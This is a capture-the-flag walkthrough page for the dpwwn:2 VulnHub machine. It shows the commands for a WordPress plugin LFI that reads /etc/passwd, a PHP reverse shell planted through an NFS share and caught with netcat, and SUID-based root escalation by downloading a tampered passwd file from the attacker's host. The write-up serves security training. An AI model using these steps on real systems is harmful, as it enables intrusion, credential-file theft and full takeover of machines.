@@ -1,0 +1,112 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">dpwwn:2 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/dpwwn2-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-18T12:27:20+00:00">August 18, 2019</time><time class="updated" datetime="2025-06-10T20:11:19+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we will take another CTF challenge dpwwn2 from the series dpwwn. The credit for making this VM machine goes to “Debashish Pal” and it is a boot2root challenge where we have to root the machine and capture the flag dpwwn-02-FLAG.txt to complete the challenge. You can download this VM <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/dpwwn-2,343/">here</a></strong>.</span></p>
+<p><span style="color: #000000;"><strong>Security Level</strong>: Intermediate</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Dirb</span></li>
+<li><span style="color: #000000;">WPScan</span></li>
+<li><span style="color: #000000;">Searchsploit</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netcat</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploiting SUID rights</span></li>
+</ul>
+<h3><span style="color: #000000;">Walkthrough:</span></h3>
+<h3><span style="color: #800000;"><strong>Scanning:</strong></span></h3>
+<p><span style="color: #000000;"><strong>Let’s start off with the scanning process. The target VM had by default a static IP as 10.10.10.10. So we put our kali machine in the same network.</strong></span></p>
+<p><span style="color: #000000;">Then we used Nmap for port scanning and found port 80, 443 and 2049 are open.</span></p>
+<pre class="lang:default decode:true">nmap –A 10.10.10.10</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-KSSy1WOAUSQ/XVlAE0FjqKI/AAAAAAAAgIc/jq7YnmKEZXY309XqDKaSjoHLvgLekHNLQCLcBGAs/s1600/1.png"/></strong></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Enumeration</span>:</strong></span></h3>
+<p><span style="color: #000000;">As we can see port 80 is open, we browsed it and got nothing more than a welcome message.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q0sFd2raEGc/XVlAH5rniyI/AAAAAAAAgJI/Gd2CW7FsY8MMXlxhc5xdWiGPFdH0gY8igCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">So our next step, as usual, is to look for the directories which we did with the help of a directory brute-forcing tool <strong>dirb. </strong>We got a directory name <strong>WordPress </strong>which means the target system might be hosting a WordPress-site.</span></p>
+<pre class="lang:default decode:true">dirb http://10.10.10.10/</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-f8-uoWPewOs/XVlAIUsQdFI/AAAAAAAAgJM/kNtn47nGcUcFt_64RI1I-6Yx7Q8TgdZmgCLcBGAs/s1600/3.png"/></strong></span></p>
+<p><span style="color: #000000;">We browsed the above-found URL and there was a WordPress-site as expected. But we couldn’t find much on the website itself.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wBwGo_y7qMA/XVlAJMzp7NI/AAAAAAAAgJQ/gh3bTWUEXxYWvxis8i4bg3X-IVXJGOw7wCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">So we took the help of <strong>Wpscan </strong>(WordPress website scanner) to look for any vulnerabilities present on the website.</span></p>
+<pre class="lang:default decode:true">wpscan --url http://10.10.10.10/wordpress -e p</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qL7YoMoeca4/XVlAJdxL00I/AAAAAAAAgJU/YtEFW5USWkk-f73jIvg4co_Kzzfa3gMfgCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">In the results, there was no such vulnerability in the WordPress version or in themes installed, but luckily there was one vulnerability in the Plugin <strong>(Site Editor 1.1.1)</strong> which was vulnerable to LFI.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-C_1Cq1jq4ak/XVlAJq5wFJI/AAAAAAAAgJY/rP68OExwKLchskefR-3Gn_04AZFpDG-KQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">We looked for its possible exploit in the Searchsploit database and found one exploit available.</span></p>
+<p><span style="color: #000000;">We copied the exploit into our root directory.</span></p>
+<pre class="lang:default decode:true">searchsploit site editor 1.1.1
+searchsploit –m 44340</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-QronhsUpaVw/XVlAJ99s9_I/AAAAAAAAgJc/ixv3OAo2ehkETIdilXxG1Sr-W9Mm6OtfwCLcBGAs/s1600/7.png"/></strong></span></p>
+<p><span style="color: #000000;">Looking inside the exploit file, in the proof of concept section, it is clearly shown how we have to execute the exploit for LFI.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9M8oVTXsLuM/XVlAKmPh7lI/AAAAAAAAgJk/6_qg8Sl7y0YpxW2StAg9OD-PAbBvnPPxwCLcBGAs/s1600/8.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation:</strong></span></h3>
+<p><span style="color: #000000;">To run the exploit for our target, we simple replaced the host with our target address and used <strong>curl </strong>to fetch the results.</span></p>
+<p><span style="color: #000000;">We successfully were able to fetch the contents of the <strong>/etc/passwd </strong>which confirmed that the website is actually vulnerable to LFI.</span></p>
+<pre class="lang:default decode:true">curl http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1K8ulinbXPA/XVlAKbBdFLI/AAAAAAAAgJg/bCOZVZsBVG0Ks6kky1-6MUPHhQGaWibywCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">So far we have a target which is vulnerable to LFI. If we are somehow able to implant a reverse shell in the target system, we will be able to execute it using LFI.</span></p>
+<p><span style="color: #000000;">If you remember from the nmap scan we have <strong>Network File Share</strong> (NFS) service running on port 2049 which is basically used to create shared folders in the network.</span></p>
+<p><span style="color: #000000;">We looked for any shared directories and found there was one such directory named <strong>/home/dpwwn02</strong>.</span></p>
+<p><span style="color: #000000;">We mounted this directory with our newly created directory <strong>/tmp/raj.</strong></span></p>
+<pre class="lang:default decode:true">showmount –e 10.10.10.10
+cd /tmp
+mkdir raj
+mount –t nfs 10.10.10.10:/home/dpwwn02 raj
+cd /raj
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WyarmlEW2R8/XVlAFCXxkxI/AAAAAAAAgIg/nDRTi7yKzMAg1TkHdp6vUepAaJ91nGxgwCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Meanwhile, we grabbed a php-reverse shell from /usr/share/webshells/php, changed the listener IP to our and saved it as <strong>shell.php.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jdMjnoL5dYw/XVlAFCIUNtI/AAAAAAAAgIk/3Orv5fUNI1YYTS7IEGNdxiymQIxmwyd6ACLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Then we copied it into the /tmp/raj folder which is mounted to /home/dpwwn02 directory of the target system, which means shell.php is in a shared directory.</span></p>
+<pre class="lang:default decode:true">cp /root/shell.php
+ls</pre>
+<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-xuzQIQ9A_9s/XVlAF1RGbQI/AAAAAAAAgIo/9IAGymwobwkHBcStQefyxeQrBQHm7BLYQCLcBGAs/s1600/12.png"/></p>
+<p><span style="color: #000000;">To execute the reverse shell in the browser, we replaced <strong>/etc/passwd </strong>with the location of the <strong>shell.php </strong>file i.e <strong>/home/dpwwn02/shell.php. </strong>Simultaneously we started a netcat listener on our kali.</span></p>
+<pre class="lang:default decode:true">http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/shell.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CEnMd5iKVQE/XVlAGHCpbmI/AAAAAAAAgIs/r5PgFSSLSOId7gQh8v7GjJzjUim1vZ2vgCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">In a few seconds, we got a reverse netcat shell with limited user privileges. It was time to find a way to get to the root shell. We looked for the binaries with SUID permissions and found the <strong>find </strong>binary has can be executed with root privileges.</span></p>
+<pre class="lang:default decode:true">nc –lvp 1234
+find /-perm –u=s –type f 2&gt;/dev/null</pre>
+<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-BciUkRkhhQQ/XVlAGfv1p3I/AAAAAAAAgIw/ExARQVl0f7MzXuWOGRqsqr02WSqSA-logCLcBGAs/s1600/14.png"/></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
+<p><span style="color: #000000;">There are multiple ways in which we can take advantage of SUID permission to <strong>find </strong>binary to do the privilege escalation. We gave <strong>wget </strong>binary the SUID permission which will help us in downloading the tempered<strong> passwd</strong> file into the <strong>/etc </strong>folder of the target system which is otherwise not permissible.</span></p>
+<p><span style="color: #000000;">We first copied the contents of <strong>/etc/passwd </strong>into our kali system.</span></p>
+<pre class="lang:default decode:true">which wget
+find /home –exec chmod u+s /usr/bin/wget \;
+ls –la /usr/bin/wget
+cat /etc/passwd
+</pre>
+<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/--YpjRhZ6L6w/XVlAGsGO61I/AAAAAAAAgI0/jLmODvzLwXAE1q0CQk-kF65Z5Gc2hqhMQCLcBGAs/s1600/15.png"/></p>
+<p><span style="color: #000000;">Then created a password hash using openssl.</span></p>
+<pre class="lang:default decode:true ">openssl passwd -1 –salt user3 pass123</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-SvsU8Eo4BMo/XVlAGxtRdtI/AAAAAAAAgI4/eF8-1RkK7fc0IuJnOwQCyUi3mH6GzZoAACLcBGAs/s1600/16.png"/></p>
+<p><span style="color: #000000;">In the <strong>passwd </strong>file which we copied from the target system, we tempered it by adding a new user <strong>raj </strong>password <strong>pass123</strong> and gave it root privileges.</span></p>
+<pre class="lang:default decode:true">nano passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PTZ0kceHur8/XVlAHMKRIcI/AAAAAAAAgI8/yoWrtqn2UbgMETkHaEczaq-bYQidF5J1gCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">After that, we started a Python one-liner http server on our kali system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WaA1w72F5Sk/XVlAHqt1aPI/AAAAAAAAgJA/bXEBS4CH2QwXGQ7q7IwGVunU9ConeT7cwCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">On the target machine, we downloaded the tampered <strong>passwd </strong>file into the <strong>/etc </strong>folder. This tempered file has a new user raj with <strong>root privileges</strong>, so all we had to do now is switch to this new user and get the root flag <strong>dpwwn-02-FLAG.txt.</strong></span></p>
+<pre class="lang:default decode:true">wget –O passwd http://10.10.10.128:8080/passwd
+su raj
+cd /root
+ls
+cat dpwwn-02-FLAG.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RTnzUnjd7tM/XVlAHmo_rHI/AAAAAAAAgJE/wqORv5PHvfovo8_wTO8cfar0nBVGXdrvgCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
